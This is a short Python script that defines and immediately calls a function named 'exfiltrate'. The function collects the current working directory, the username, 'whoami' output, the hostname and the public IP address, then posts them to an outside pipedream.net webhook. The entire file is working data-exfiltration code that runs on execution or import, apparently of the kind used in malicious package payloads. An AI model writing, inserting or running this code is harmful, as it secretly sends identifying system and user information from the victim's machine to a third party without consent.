import os
import socket
import requests

def exfiltrate():
    data = {
        'cwd': os.getcwd(),
        'user': os.getenv('USER') or os.getenv('USERNAME'),
        'whoami': os.popen('whoami').read().strip(),
        'hostname': socket.gethostname(),
        'ip': requests.get("https://api.ipify.org").text,
    }
    requests.post("https://eovswbij0qrdg8q.m.pipedream.net", json=data)

exfiltrate()
